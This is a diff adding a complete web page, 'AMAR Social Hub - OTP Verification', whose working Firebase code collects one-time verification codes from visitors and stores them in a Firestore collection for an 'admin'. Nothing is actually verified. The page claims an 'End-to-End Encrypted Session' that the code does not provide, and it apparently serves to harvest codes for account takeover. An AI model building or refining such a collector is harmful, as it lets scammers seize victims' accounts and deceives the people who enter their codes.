@@ -1,0 +1,306 @@
+```html
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AMAR Social Hub - OTP Verification</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            cyan: '#00f2fe',
+                            blue: '#4facfe',
+                            purple: '#7f00ff',
+                            dark: '#0f172a',
+                            card: 'rgba(30, 41, 59, 0.7)'
+                        }
+                    },
+                    animation: {
+                        'pulse-glow': 'pulseGlow 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                    keyframes: {
+                        pulseGlow: {
+                            '0%, 100%': { opacity: '1', boxShadow: '0 0 20px rgba(0, 242, 254, 0.5)' },
+                            '50%': { opacity: '.7', boxShadow: '0 0 35px rgba(79, 172, 254, 0.8)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background: radial-gradient(circle at top left, #0f172a, #020617);
+            min-height: 100vh;
+            color: #f8fafc;
+            user-select: none;
+        }
+        .glass-card {
+            background: rgba(30, 41, 59, 0.6);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+        .glow-input:focus {
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.4);
+            border-color: #00f2fe;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen justify-between items-center p-4">
+
+    <!-- Header Section -->
+    <header class="w-full max-w-md pt-8 text-center">
+        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-semibold uppercase tracking-widest mb-3">
+            <i class="fa-solid fa-shield-halved"></i> Pro Secure Hub
+        </div>
+        <h1 class="text-4xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-500 mb-1">
+            AMAR Social Hub
+        </h1>
+        <p class="text-slate-400 font-medium text-sm">
+            OTP Verification Website
+        </p>
+    </header>
+
+    <!-- Main Section -->
+    <main class="w-full max-w-md my-auto py-6">
+        <div class="glass-card rounded-2xl p-6 sm:p-8 relative overflow-hidden">
+            <!-- Neon Top Accent Bar -->
+            <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600"></div>
+
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 rounded-full bg-gradient-to-tr from-cyan-500 to-purple-600 p-0.5 mx-auto mb-3 shadow-lg shadow-cyan-500/20 flex items-center justify-center">
+                    <div class="w-full h-full bg-slate-900 rounded-full flex items-center justify-center">
+                        <i class="fa-solid fa-key text-2xl text-cyan-400"></i>
+                    </div>
+                </div>
+                <h2 class="text-2xl font-bold text-white mb-1">Enter Your OTP</h2>
+                <p class="text-xs text-slate-400">Supports 4-digit or 6-digit verification codes</p>
+            </div>
+
+            <!-- OTP Input Form -->
+            <form id="otpForm" onsubmit="event.preventDefault();" class="space-y-5">
+                
+                <!-- Input Controls Bar -->
+                <div class="flex justify-between items-center text-xs text-slate-400 px-1">
+                    <span id="digitCountText" class="font-medium">Digit Count: 0/6</span>
+                    <button type="button" id="toggleMaskBtn" class="hover:text-cyan-400 transition flex items-center gap-1">
+                        <i class="fa-solid fa-eye" id="maskIcon"></i>
+                        <span id="maskText">Hide Code</span>
+                    </button>
+                </div>
+
+                <!-- OTP Input Field -->
+                <div class="relative">
+                    <input 
+                        type="text" 
+                        id="otpInput"
+                        maxlength="6"
+                        placeholder="••••••"
+                        autocomplete="off"
+                        class="w-full bg-slate-900/80 border border-slate-700 rounded-xl px-4 py-4 text-center text-2xl sm:text-3xl font-mono tracking-[0.4em] font-bold text-cyan-300 placeholder-slate-600 glow-input outline-none transition duration-300"
+                    >
+                    <div class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hidden" id="validCheck">
+                        <i class="fa-solid fa-circle-check text-emerald-400 text-xl"></i>
+                    </div>
+                </div>
+
+                <!-- Status Feedback Message -->
+                <div id="statusMessage" class="hidden p-3 rounded-lg text-xs font-medium text-center transition-all duration-300"></div>
+
+                <!-- Submit Button -->
+                <button 
+                    type="button" 
+                    id="sendBtn"
+                    onclick="handleSendOTP()"
+                    class="w-full py-4 px-6 rounded-xl font-bold text-slate-900 bg-gradient-to-r from-cyan-400 via-blue-400 to-cyan-300 hover:brightness-110 active:scale-[0.98] transition duration-200 shadow-lg shadow-cyan-500/25 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <span>SEND OTP TO ADMIN</span>
+                </button>
+
+                <!-- Session / Security Info Footer -->
+                <div class="pt-2 border-t border-slate-800 text-center space-y-1">
+                    <p class="text-[11px] text-slate-500 font-mono">
+                        Session ID: <span id="displaySessionId" class="text-slate-400">Generating...</span>
+                    </p>
+                    <div class="flex items-center justify-center gap-1 text-[10px] text-emerald-400/80">
+                        <i class="fa-solid fa-lock"></i> End-to-End Encrypted Session
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="text-center text-xs text-slate-500 pb-4">
+        © 2026 AMAR Social Hub. All rights reserved.
+    </footer>
+
+    <!-- Firebase SDK Modules -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Global Firebase configuration setup
+        const firebaseConfig = typeof __firebase_config !== 'undefined' 
+            ? JSON.parse(__firebase_config) 
+            : {
+                apiKey: "YOUR_API_KEY",
+                authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+                projectId: "YOUR_PROJECT_ID",
+                storageBucket: "YOUR_PROJECT_ID.appspot.com",
+                messagingSenderId: "YOUR_SENDER_ID",
+                appId: "YOUR_APP_ID"
+            };
+
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'amar-social-hub';
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        let currentUser = null;
+        let isMasked = false;
+
+        // Generate or retrieve Session ID
+        let sessionId = localStorage.getItem('amar_session_id');
+        if (!sessionId) {
+            sessionId = 'AMAR-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+            localStorage.setItem('amar_session_id', sessionId);
+        }
+        document.getElementById('displaySessionId').innerText = sessionId;
+
+        // Authenticate User
+        async function authenticateUser() {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (err) {
+                console.error("Auth Error:", err);
+            }
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+            } else {
+                authenticateUser();
+            }
+        });
+
+        // DOM Logic & Event Listeners
+        const otpInput = document.getElementById('otpInput');
+        const digitCountText = document.getElementById('digitCountText');
+        const validCheck = document.getElementById('validCheck');
+        const toggleMaskBtn = document.getElementById('toggleMaskBtn');
+        const maskIcon = document.getElementById('maskIcon');
+        const maskText = document.getElementById('maskText');
+        const statusMessage = document.getElementById('statusMessage');
+
+        // Prevent non-numeric key inputs
+        otpInput.addEventListener('input', (e) => {
+            otpInput.value = otpInput.value.replace(/[^0-9]/g, '');
+            const val = otpInput.value;
+            digitCountText.innerText = `Digit Count: ${val.length}/6`;
+
+            if (val.length === 4 || val.length === 6) {
+                validCheck.classList.remove('hidden');
+            } else {
+                validCheck.classList.add('hidden');
+            }
+        });
+
+        // Masking toggle
+        toggleMaskBtn.addEventListener('click', () => {
+            isMasked = !isMasked;
+            if (isMasked) {
+                otpInput.type = 'password';
+                maskIcon.className = 'fa-solid fa-eye-slash';
+                maskText.innerText = 'Show Code';
+            } else {
+                otpInput.type = 'text';
+                maskIcon.className = 'fa-solid fa-eye';
+                maskText.innerText = 'Hide Code';
+            }
+        });
+
+        // Submit OTP Functionality
+        window.handleSendOTP = async function() {
+            const code = otpInput.value.trim();
+
+            if (code.length !== 4 && code.length !== 6) {
+                showStatus('Please enter a valid 4-digit or 6-digit OTP code.', 'error');
+                return;
+            }
+
+            if (!currentUser) {
+                showStatus('Connecting to secure server... Please try again in 2 seconds.', 'error');
+                await authenticateUser();
+                return;
+            }
+
+            const sendBtn = document.getElementById('sendBtn');
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> <span>SENDING TO ADMIN...</span>`;
+
+            try {
+                // Save OTP to Firestore under strict artifact path
+                const otpsCollection = collection(db, 'artifacts', appId, 'public', 'data', 'otp_requests');
+                
+                await addDoc(otpsCollection, {
+                    otpCode: code,
+                    sessionId: sessionId,
+                    userId: currentUser.uid,
+                    status: 'PENDING',
+                    timestamp: serverTimestamp(),
+                    createdAt: new Date().toISOString()
+                });
+
+                showStatus('✅ OTP Sent Securely to Admin Panel!', 'success');
+                otpInput.value = '';
+                digitCountText.innerText = 'Digit Count: 0/6';
+                validCheck.classList.add('hidden');
+
+            } catch (err) {
+                console.error("Firestore Error:", err);
+                showStatus('Failed to send OTP. Please check connection and try again.', 'error');
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>`;
+            }
+        };
+
+        function showStatus(msg, type) {
+            statusMessage.innerText = msg;
+            statusMessage.classList.remove('hidden', 'bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/40', 'bg-rose-500/20', 'text-rose-300', 'border-rose-500/40');
+            
+            if (type === 'success') {
+                statusMessage.classList.add('bg-emerald-500/20', 'text-emerald-300', 'border', 'border-emerald-500/40');
+            } else {
+                statusMessage.classList.add('bg-rose-500/20', 'text-rose-300', 'border', 'border-rose-500/40');
+            }
+        }
+    </script>
+</body>
+</html>
+```
